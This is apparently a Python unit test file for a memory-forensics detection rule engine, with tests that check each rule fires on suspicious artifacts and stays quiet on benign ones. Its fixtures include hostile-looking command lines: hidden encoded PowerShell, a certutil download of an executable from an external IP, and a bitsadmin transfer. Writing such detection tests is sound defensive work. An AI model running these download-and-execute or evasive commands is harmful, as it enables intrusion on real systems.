"""
Tests for Tier 3 -- the rule engine and rule pack v1.

Two kinds of assertion here, and the second kind matters more.

*Positive*: the rule fires on the artifact it exists to catch.

*Negative*: the rule stays silent on the benign look-alike. A detection
rule is only as good as its false-positive behaviour -- a rule that
fires on every Chrome tab is not a weak rule, it is a rule the analyst
will filter out, taking the one real hit with it. Every rule below has
at least one negative test built from the thing it must not flag.
"""

from __future__ import annotations

import unittest

from memory_agent.core.errors import DuplicateRuleId
from memory_agent.core.schema import (
    MAX_CONFIDENCE,
    IdFactory,
    Observation,
    Provenance,
)
from memory_agent.detectors import (
    RULE_PACK,
    DetectionContext,
    Rule,
    RuleEngine,
    RuleHit,
    default_engine,
)

from .fixtures import load_results


def obs(obs_type: str, obs_id: str, **fields) -> Observation:
    return Observation(
        obs_id=obs_id, type=obs_type,
        provenance=Provenance(plugin="test", row_index=0),
        fields=fields,
    )


def run(observations, rule_id: str | None = None, not_evaluable=None):
    engine = default_engine()
    findings, outcomes, limitations = engine.run(
        DetectionContext(observations), ids=IdFactory(),
        not_evaluable=not_evaluable or {},
    )
    if rule_id:
        findings = [f for f in findings if f.rule_id == rule_id]
    return findings, outcomes, limitations


def process(pid, name, **kw):
    base = {
        "pid": pid, "name": name, "ppid": kw.pop("ppid", 812),
        "path": kw.pop("path", None), "create_time_utc": kw.pop("create", None),
        "exit_time_utc": kw.pop("exit", None), "session_id": kw.pop("session", 1),
        "cross_view": kw.pop("cross_view",
                             {"pslist": True, "psscan": True,
                              "pstree": True, "psxview": True}),
        "psxview_flags": kw.pop("psxview_flags", None),
    }
    base.update(kw)
    return obs("process", f"OBS-PROC-{pid:04d}", **base)


# ── engine mechanics ──────────────────────────────────────────────────


class EngineTests(unittest.TestCase):
    def test_a_rule_that_raises_costs_only_itself(self) -> None:
        def explode(context):
            raise RuntimeError("boom")

        def works(context):
            yield RuleHit(
                observation_refs=["OBS-PROC-0001"],
                observation_statement="fact", interpretation="maybe",
                alternative_explanations=["benign"], analyst_action="look",
                entities={"pids": [1]},
            )

        engine = RuleEngine([
            Rule("MEM-X-001", "1.0", "Explodes", "test", "HIGH", 0.5, explode),
            Rule("MEM-X-002", "1.0", "Works", "test", "HIGH", 0.5, works),
        ])
        findings, outcomes, limitations = engine.run(DetectionContext([]))
        self.assertEqual(len(findings), 1)
        statuses = {o.rule_id: o.status for o in outcomes}
        self.assertEqual(statuses["MEM-X-001"], "error")
        self.assertEqual(statuses["MEM-X-002"], "evaluated")
        self.assertTrue(any("RuntimeError" in item for item in limitations))

    def test_an_ungated_rule_is_reported_as_not_evaluated_not_as_clean(self) -> None:
        findings, outcomes, limitations = run(
            [], not_evaluable={"MEM-P-001": ["windows.psscan (timeout)"]}
        )
        outcome = next(o for o in outcomes if o.rule_id == "MEM-P-001")
        self.assertEqual(outcome.status, "not_evaluated")
        self.assertTrue(any(
            "NOT evaluated" in item and "not evidence of its absence" in item
            for item in limitations
        ))

    def test_duplicate_rule_ids_are_rejected_at_construction(self) -> None:
        rule = RULE_PACK[0]
        with self.assertRaises(DuplicateRuleId):
            RuleEngine([rule, rule])

    def test_confidence_is_capped_and_the_cap_is_explained(self) -> None:
        def greedy(context):
            yield RuleHit(
                observation_refs=["OBS-PROC-0001"],
                observation_statement="f", interpretation="i",
                alternative_explanations=["a"], analyst_action="x",
                confidence_adjustments=[(0.9, "+0.90 test")],
                entities={"pids": [1]},
            )

        engine = RuleEngine([
            Rule("MEM-X-001", "1.0", "Greedy", "test", "HIGH", 0.8, greedy)
        ])
        findings, _, _ = engine.run(DetectionContext([]))
        self.assertEqual(findings[0].confidence, MAX_CONFIDENCE)
        self.assertIn("capped", findings[0].confidence_basis)

    def test_the_basis_states_every_term(self) -> None:
        findings, _, _ = run([
            process(2456, "data_transfer.exe"),
            obs("injection", "OBS-INJ-0001", pid=2456,
                process="data_transfer.exe", executable=True,
                private_memory=True, writable_and_executable=True,
                starts_with_mz=True, protection="PAGE_EXECUTE_READWRITE",
                region_start="0x2a0000"),
        ], "MEM-I-001")
        basis = findings[0].confidence_basis
        self.assertIn("base", basis)
        self.assertIn("+0.15", basis)
        self.assertIn("+0.20", basis)

    def test_corroboration_is_bounded_and_named(self) -> None:
        findings, _, _ = run([
            process(2456, "data_transfer.exe"),
            obs("injection", "OBS-INJ-0001", pid=2456,
                process="data_transfer.exe", executable=True,
                private_memory=True, writable_and_executable=True,
                starts_with_mz=True, protection="PAGE_EXECUTE_READWRITE"),
            obs("network", "OBS-NET-0001", pid=2456, owner="data_transfer.exe",
                protocol="TCPv4", state="ESTABLISHED",
                foreign_address="185.77.22.90", foreign_port=4444,
                foreign_scope="public", local_scope="private"),
        ])
        injection = next(f for f in findings if f.rule_id == "MEM-I-001")
        self.assertIn("corroborated by", injection.confidence_basis)

    def test_findings_are_deterministic_across_input_order(self) -> None:
        observations = [
            process(900, "a.exe", cross_view={"pslist": False, "psscan": True,
                                              "pstree": True, "psxview": True}),
            process(901, "b.exe", cross_view={"pslist": False, "psscan": True,
                                              "pstree": True, "psxview": True}),
        ]
        first, _, _ = run(observations)
        second, _, _ = run(list(reversed(observations)))
        self.assertEqual(
            [(f.finding_id, f.rule_id, f.observation_refs) for f in first],
            [(f.finding_id, f.rule_id, f.observation_refs) for f in second],
        )


# ── process rules ─────────────────────────────────────────────────────


class ProcessRuleTests(unittest.TestCase):
    def test_p001_fires_on_a_pool_only_process(self) -> None:
        findings, _, _ = run([process(
            3999, "svch0st.exe",
            cross_view={"pslist": False, "psscan": True, "pstree": False,
                        "psxview": True},
        )], "MEM-P-001")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "CRITICAL")

    def test_p001_stays_silent_when_pslist_did_not_run(self) -> None:
        # The single most important negative test in the suite.
        findings, _, _ = run([process(
            3999, "svch0st.exe",
            cross_view={"pslist": None, "psscan": True, "pstree": None,
                        "psxview": None},
        )], "MEM-P-001")
        self.assertEqual(findings, [])

    def test_p001_discounts_a_process_that_simply_exited(self) -> None:
        findings, _, _ = run([process(
            3050, "uploader.exe", exit="2026-04-12T02:21:02Z",
            cross_view={"pslist": False, "psscan": True, "pstree": False,
                        "psxview": True},
        )], "MEM-P-001")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "MEDIUM")
        self.assertIn("-0.35", findings[0].confidence_basis)

    def test_p002_fires_on_an_exited_process_owning_a_socket(self) -> None:
        findings, _, _ = run([
            process(3050, "uploader.exe", exit="2026-04-12T02:21:02Z"),
            obs("network", "OBS-NET-0001", pid=3050, owner="uploader.exe",
                protocol="TCPv4", state="ESTABLISHED",
                foreign_address="45.155.205.18", foreign_port=8080,
                foreign_scope="public", local_scope="private"),
        ], "MEM-P-002")
        self.assertEqual(len(findings), 1)

    def test_p002_discounts_when_a_live_process_shares_the_pid(self) -> None:
        findings, _, _ = run([
            process(3050, "uploader.exe", exit="2026-04-12T02:21:02Z"),
            process(3050, "other.exe", create="2026-04-12T02:22:00Z"),
            obs("network", "OBS-NET-0001", pid=3050, owner="other.exe",
                protocol="TCPv4", state="ESTABLISHED",
                foreign_address="45.155.205.18", foreign_port=8080,
                foreign_scope="public", local_scope="private"),
        ], "MEM-P-002")
        self.assertIn("PID reuse", findings[0].alternative_explanations[0]
                      .replace("was reused", "PID reuse"))
        self.assertIn("-0.30", findings[0].confidence_basis)

    def test_p003_fires_on_lsass_parented_by_explorer(self) -> None:
        findings, _, _ = run([
            process(2100, "explorer.exe", ppid=1900),
            process(4100, "lsass.exe", ppid=2100),
        ], "MEM-P-003")
        self.assertEqual(len(findings), 1)

    def test_p003_silent_on_the_canonical_hierarchy(self) -> None:
        findings, _, _ = run([
            process(536, "wininit.exe", ppid=376),
            process(632, "lsass.exe", ppid=536),
            process(624, "services.exe", ppid=536),
            process(812, "svchost.exe", ppid=624),
        ], "MEM-P-003")
        self.assertEqual(findings, [])

    def test_p003_silent_when_the_parent_is_not_resident(self) -> None:
        # An unknown parent is MEM-P-005's business, not a wrong parent.
        findings, _, _ = run([process(632, "lsass.exe", ppid=99999)],
                             "MEM-P-003")
        self.assertEqual(findings, [])

    def test_p004_fires_on_a_system_binary_outside_system32(self) -> None:
        findings, _, _ = run([process(
            4100, "lsass.exe", ppid=536,
            path="C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.exe",
        )], "MEM-P-004")
        self.assertEqual(len(findings), 1)

    def test_p004_silent_on_system32_and_on_syswow64(self) -> None:
        findings, _, _ = run([
            process(632, "lsass.exe", ppid=536,
                    path="C:\\Windows\\System32\\lsass.exe"),
            process(700, "svchost.exe", ppid=624,
                    path="C:\\Windows\\SysWOW64\\svchost.exe"),
        ], "MEM-P-004")
        self.assertEqual(findings, [])

    def test_p005_fires_on_a_live_process_with_no_resident_parent(self) -> None:
        findings, _, _ = run([process(3600, "stage2.exe", ppid=9999)],
                             "MEM-P-005")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "INFO")

    def test_p005_exempts_explorer_which_is_orphaned_by_design(self) -> None:
        findings, _, _ = run([process(2100, "explorer.exe", ppid=1900)],
                             "MEM-P-005")
        self.assertEqual(findings, [])

    def test_p006_fires_on_two_live_lsass(self) -> None:
        findings, _, _ = run([
            process(632, "lsass.exe", ppid=536),
            process(4100, "lsass.exe", ppid=2100),
        ], "MEM-P-006")
        self.assertEqual(len(findings), 1)
        self.assertEqual(sorted(findings[0].entities["pids"]), [632, 4100])

    def test_p006_ignores_an_exited_duplicate(self) -> None:
        findings, _, _ = run([
            process(632, "lsass.exe", ppid=536),
            process(4100, "lsass.exe", ppid=536, exit="2026-04-12T02:20:00Z"),
        ], "MEM-P-006")
        self.assertEqual(findings, [])

    def test_p006_does_not_fire_on_multiple_csrss(self) -> None:
        # Two csrss instances is normal, one per session.
        findings, _, _ = run([
            process(464, "csrss.exe", ppid=376, session=0),
            process(560, "csrss.exe", ppid=376, session=1),
        ], "MEM-P-006")
        self.assertEqual(findings, [])


# ── injection rules ───────────────────────────────────────────────────


class InjectionRuleTests(unittest.TestCase):
    def injection(self, pid, name, **kw):
        fields = {
            "pid": pid, "process": name, "executable": True,
            "private_memory": True, "writable_and_executable": True,
            "starts_with_mz": True, "protection": "PAGE_EXECUTE_READWRITE",
            "region_start": "0x2a0000", "region_size_bytes": 65536,
        }
        fields.update(kw)
        return obs("injection", f"OBS-INJ-{pid:04d}", **fields)

    def test_i001_fires_on_an_rwx_region_holding_a_pe(self) -> None:
        findings, _, _ = run([self.injection(2456, "data_transfer.exe")],
                             "MEM-I-001")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "HIGH")

    def test_i001_discounts_a_known_jit_host(self) -> None:
        findings, _, _ = run([
            self.injection(2456, "data_transfer.exe"),
            self.injection(3200, "chrome.exe", starts_with_mz=False),
        ], "MEM-I-001")
        by_pid = {f.entities["pids"][0]: f for f in findings}
        self.assertLess(by_pid[3200].confidence, by_pid[2456].confidence)
        self.assertIn("just-in-time", by_pid[3200].confidence_basis)

    def test_i001_always_offers_the_jit_explanation(self) -> None:
        findings, _, _ = run([self.injection(2456, "x.exe")], "MEM-I-001")
        joined = " ".join(findings[0].alternative_explanations).lower()
        self.assertIn("just-in-time", joined)

    def test_i001_silent_on_a_shared_file_backed_region(self) -> None:
        findings, _, _ = run([
            self.injection(2456, "x.exe", private_memory=False),
        ], "MEM-I-001")
        self.assertEqual(findings, [])

    def test_i002_fires_on_a_module_missing_from_every_peb_list(self) -> None:
        findings, _, _ = run([obs(
            "module", "OBS-MOD-0001", scope="user", pid=3200,
            process="chrome.exe", name="wsock32.dll", base="0x7ffb12440000",
            peb_lists={"in_load": False, "in_init": False, "in_mem": False},
        )], "MEM-I-002")
        self.assertEqual(len(findings), 1)

    def test_i002_silent_on_a_fully_linked_module(self) -> None:
        findings, _, _ = run([obs(
            "module", "OBS-MOD-0001", scope="user", pid=3200,
            process="chrome.exe", name="ntdll.dll",
            peb_lists={"in_load": True, "in_init": True, "in_mem": True},
        )], "MEM-I-002")
        self.assertEqual(findings, [])

    def test_i002_silent_on_the_process_own_image(self) -> None:
        # The executable is absent from InInit by design; firing here
        # would produce one finding per process on a clean machine.
        findings, _, _ = run([obs(
            "module", "OBS-MOD-0001", scope="user", pid=3200,
            process="chrome.exe", name="chrome.exe",
            peb_lists={"in_load": True, "in_init": False, "in_mem": True},
        )], "MEM-I-002")
        self.assertEqual(findings, [])

    def test_i002_discounts_an_ininit_only_mismatch(self) -> None:
        findings, _, _ = run([obs(
            "module", "OBS-MOD-0001", scope="user", pid=3200,
            process="chrome.exe", name="other.dll",
            peb_lists={"in_load": True, "in_init": False, "in_mem": True},
        )], "MEM-I-002")
        self.assertIn("-0.25", findings[0].confidence_basis)

    def test_i002_silent_when_fewer_than_three_lists_were_read(self) -> None:
        findings, _, _ = run([obs(
            "module", "OBS-MOD-0001", scope="user", pid=3200,
            process="chrome.exe", name="other.dll",
            peb_lists={"in_load": True, "in_init": None, "in_mem": None},
        )], "MEM-I-002")
        self.assertEqual(findings, [])

    def test_i003_fires_on_a_path_mismatch(self) -> None:
        findings, _, _ = run([obs(
            "injection", "OBS-INJ-0001", kind="image_path_discrepancy",
            pid=3600, process="stage2.exe", paths_agree=False,
            eprocess_image_path="C:\\Temp\\stage2.exe",
            vad_backing_path="C:\\Windows\\System32\\svchost.exe",
        )], "MEM-I-003")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "CRITICAL")

    def test_i003_silent_when_the_paths_agree_or_are_unknown(self) -> None:
        findings, _, _ = run([
            obs("injection", "OBS-INJ-0001", kind="image_path_discrepancy",
                pid=1, paths_agree=True),
            obs("injection", "OBS-INJ-0002", kind="image_path_discrepancy",
                pid=2, paths_agree=None),
        ], "MEM-I-003")
        self.assertEqual(findings, [])


# ── network rules ─────────────────────────────────────────────────────


class NetworkRuleTests(unittest.TestCase):
    def socket(self, obs_id, **kw):
        fields = {
            "protocol": "TCPv4", "state": "ESTABLISHED", "pid": 2456,
            "owner": "data_transfer.exe", "local_address": "10.0.2.15",
            "local_port": 51234, "local_scope": "private",
            "foreign_address": "185.77.22.90", "foreign_port": 4444,
            "foreign_scope": "public", "netscan_only": False,
        }
        fields.update(kw)
        return obs("network", obs_id, **fields)

    def test_n001_fires_on_an_external_established_connection(self) -> None:
        findings, _, _ = run([self.socket("OBS-NET-0001")], "MEM-N-001")
        self.assertEqual(len(findings), 1)

    def test_n001_silent_on_private_and_loopback_peers(self) -> None:
        findings, _, _ = run([
            self.socket("OBS-NET-0001", foreign_address="10.0.2.20",
                        foreign_scope="private"),
            self.socket("OBS-NET-0002", foreign_address="127.0.0.1",
                        foreign_scope="loopback"),
        ], "MEM-N-001")
        self.assertEqual(findings, [])

    def test_n001_discounts_a_browser(self) -> None:
        findings, _, _ = run([
            self.socket("OBS-NET-0001", pid=3200, owner="chrome.exe",
                        foreign_port=443),
        ], "MEM-N-001")
        self.assertIn("-0.30", findings[0].confidence_basis)

    def test_n002_fires_on_a_user_process_listening_externally(self) -> None:
        findings, _, _ = run([self.socket(
            "OBS-NET-0001", state="LISTENING", local_address="0.0.0.0",
            local_port=1337, local_scope="unspecified", foreign_address="*",
            foreign_scope="unspecified",
        )], "MEM-N-002")
        self.assertEqual(len(findings), 1)

    def test_n002_silent_on_loopback_and_on_system_listeners(self) -> None:
        findings, _, _ = run([
            self.socket("OBS-NET-0001", state="LISTENING",
                        local_address="127.0.0.1", local_scope="loopback",
                        local_port=49670),
            self.socket("OBS-NET-0002", state="LISTENING", pid=4,
                        owner="System", local_address="0.0.0.0",
                        local_scope="unspecified", local_port=445),
        ], "MEM-N-002")
        self.assertEqual(findings, [])

    def test_n003_fires_on_a_tooling_default_port(self) -> None:
        findings, _, _ = run([self.socket("OBS-NET-0001", foreign_port=4444)],
                             "MEM-N-003")
        self.assertEqual(len(findings), 1)

    def test_n003_does_not_fire_on_https(self) -> None:
        # 443 would produce one finding per browser tab on a clean image.
        findings, _, _ = run([
            self.socket("OBS-NET-0001", pid=3200, owner="chrome.exe",
                        foreign_port=443, foreign_address="142.250.72.196"),
            self.socket("OBS-NET-0002", pid=3200, owner="chrome.exe",
                        foreign_port=80, foreign_address="142.250.72.196"),
        ], "MEM-N-003")
        self.assertEqual(findings, [])


# ── command rules ─────────────────────────────────────────────────────


class CommandRuleTests(unittest.TestCase):
    def command(self, obs_id, text, kind="launch_parameters", pid=2800,
                name="powershell.exe"):
        from memory_agent.extractors.commands import basename, split_command
        executable, arguments = split_command(text)
        return obs("command", obs_id, pid=pid, process=name, source_kind=kind,
                   command_line=text, executable=executable,
                   executable_name=basename(executable), arguments=arguments)

    def test_c001_fires_on_encoded_hidden_powershell(self) -> None:
        findings, _, _ = run([self.command(
            "OBS-CMD-0001",
            "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgA",
        )], "MEM-C-001")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "CRITICAL")

    def test_c001_silent_on_ordinary_powershell(self) -> None:
        findings, _, _ = run([self.command(
            "OBS-CMD-0001", "powershell.exe -File C:\\Scripts\\backup.ps1",
        )], "MEM-C-001")
        self.assertEqual(findings, [])

    def test_c001_weakens_a_hit_from_carved_history(self) -> None:
        text = "powershell.exe -nop -w hidden -enc SQBFAFgA"
        launched, _, _ = run([self.command("OBS-CMD-0001", text)], "MEM-C-001")
        carved, _, _ = run([self.command("OBS-CMD-0001", text,
                                         kind="typed_history")], "MEM-C-001")
        self.assertLess(carved[0].confidence, launched[0].confidence)
        self.assertIn("-0.15", carved[0].confidence_basis)

    def test_c001_always_offers_the_management_tool_explanation(self) -> None:
        findings, _, _ = run([self.command(
            "OBS-CMD-0001", "powershell.exe -nop -w hidden -enc SQBFAFgA",
        )], "MEM-C-001")
        joined = " ".join(findings[0].alternative_explanations)
        self.assertIn("deployment", joined)

    def test_c002_fires_on_certutil_download(self) -> None:
        findings, _, _ = run([self.command(
            "OBS-CMD-0001",
            "certutil -urlcache -split -f http://185.77.22.90/a.exe a.exe",
            kind="console_buffer",
        )], "MEM-C-002")
        self.assertEqual(len(findings), 1)
        self.assertIn("http://185.77.22.90/a.exe", findings[0].entities["urls"])

    def test_c002_silent_on_ordinary_certutil_use(self) -> None:
        findings, _, _ = run([self.command(
            "OBS-CMD-0001", "certutil -store My", kind="console_buffer",
        )], "MEM-C-002")
        self.assertEqual(findings, [])

    def test_c002_emits_one_finding_per_command(self) -> None:
        findings, _, _ = run([self.command(
            "OBS-CMD-0001",
            "certutil -urlcache -f http://x/a && bitsadmin /transfer j",
        )], "MEM-C-002")
        self.assertEqual(len(findings), 1)

    def test_c003_needs_three_distinct_discovery_commands(self) -> None:
        two, _, _ = run([
            self.command("OBS-CMD-0001", "whoami", kind="typed_history"),
            self.command("OBS-CMD-0002", "ipconfig /all", kind="typed_history"),
        ], "MEM-C-003")
        self.assertEqual(two, [])

        three, _, _ = run([
            self.command("OBS-CMD-0001", "whoami", kind="typed_history"),
            self.command("OBS-CMD-0002", "ipconfig /all", kind="typed_history"),
            self.command("OBS-CMD-0003", "systeminfo", kind="typed_history"),
        ], "MEM-C-003")
        self.assertEqual(len(three), 1)

    def test_c003_groups_by_process(self) -> None:
        findings, _, _ = run([
            self.command("OBS-CMD-0001", "whoami", pid=100),
            self.command("OBS-CMD-0002", "ipconfig /all", pid=200),
            self.command("OBS-CMD-0003", "systeminfo", pid=300),
        ], "MEM-C-003")
        self.assertEqual(findings, [])


# ── module and service rules ──────────────────────────────────────────


class ModuleServiceRuleTests(unittest.TestCase):
    def test_m001_fires_on_a_modscan_only_driver(self) -> None:
        findings, _, _ = run([obs(
            "module", "OBS-MOD-0001", scope="kernel", name="np_flt.sys",
            base="0xf8026a140000",
            cross_view={"modules": False, "modscan": True},
        )], "MEM-M-001")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].severity, "CRITICAL")

    def test_m001_silent_when_the_module_list_did_not_run(self) -> None:
        findings, _, _ = run([obs(
            "module", "OBS-MOD-0001", scope="kernel", name="np_flt.sys",
            cross_view={"modules": None, "modscan": True},
        )], "MEM-M-001")
        self.assertEqual(findings, [])

    def test_m001_silent_on_a_listed_driver(self) -> None:
        findings, _, _ = run([obs(
            "module", "OBS-MOD-0001", scope="kernel", name="tcpip.sys",
            cross_view={"modules": True, "modscan": True},
        )], "MEM-M-001")
        self.assertEqual(findings, [])

    def service(self, obs_id, path, **kw):
        from memory_agent.extractors.services import expand_path
        normalised, unresolved = expand_path(path)
        fields = {
            "name": kw.pop("name", "UpdaterSvc"),
            "display_name": "Helper", "state": "SERVICE_STOPPED",
            "start_type": kw.pop("start", "SERVICE_AUTO_START"),
            "binary_raw": path, "executable": path,
            "executable_name": path.rsplit("\\", 1)[-1],
            "executable_path_normalised": normalised,
            "path_variables_unresolved": unresolved, "pid": None,
        }
        fields.update(kw)
        return obs("service", obs_id, **fields)

    def test_s001_fires_on_a_binary_in_users_public(self) -> None:
        findings, _, _ = run(
            [self.service("OBS-SVC-0001", "C:\\Users\\Public\\upd.exe")],
            "MEM-S-001",
        )
        self.assertEqual(len(findings), 1)
        self.assertIn("+0.10", findings[0].confidence_basis)  # auto-start

    def test_s001_silent_on_program_files_and_system32(self) -> None:
        findings, _, _ = run([
            self.service("OBS-SVC-0001",
                         "C:\\Program Files\\Vendor\\agent.exe"),
            self.service("OBS-SVC-0002",
                         "C:\\Windows\\System32\\svchost.exe"),
        ], "MEM-S-001")
        self.assertEqual(findings, [])

    def test_s001_declines_to_judge_an_unexpandable_path(self) -> None:
        findings, _, _ = run(
            [self.service("OBS-SVC-0001", "%CustomVar%\\Temp\\a.exe")],
            "MEM-S-001",
        )
        self.assertEqual(findings, [])


# ── the pack as a whole ───────────────────────────────────────────────


class RulePackTests(unittest.TestCase):
    def test_seventeen_rules_with_unique_ids(self) -> None:
        self.assertEqual(len(RULE_PACK), 17)
        self.assertEqual(len({r.rule_id for r in RULE_PACK}), 17)

    def test_every_rule_declares_its_metadata(self) -> None:
        for rule in RULE_PACK:
            self.assertTrue(rule.version)
            self.assertTrue(rule.description)
            self.assertIn(rule.severity,
                          ("INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"))
            self.assertLessEqual(rule.base_confidence, MAX_CONFIDENCE)

    def test_every_finding_from_the_corpus_has_the_four_fields(self) -> None:
        from memory_agent.extractors import extract_all

        observations, _, _ = extract_all(load_results())
        findings, _, _ = run(observations)
        self.assertGreater(len(findings), 10)
        for finding in findings:
            self.assertTrue(finding.observation_statement.strip())
            self.assertTrue(finding.interpretation.strip())
            self.assertTrue(finding.alternative_explanations)
            self.assertTrue(finding.analyst_action.strip())
            self.assertTrue(finding.observation_refs)

    def test_the_corpus_exercises_every_rule_in_the_pack(self) -> None:
        from memory_agent.extractors import extract_all

        observations, _, _ = extract_all(load_results())
        findings, outcomes, _ = run(observations)
        fired = {f.rule_id for f in findings}
        missing = {r.rule_id for r in RULE_PACK} - fired
        self.assertEqual(
            missing, set(),
            f"the fixture corpus does not trigger: {sorted(missing)}",
        )


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
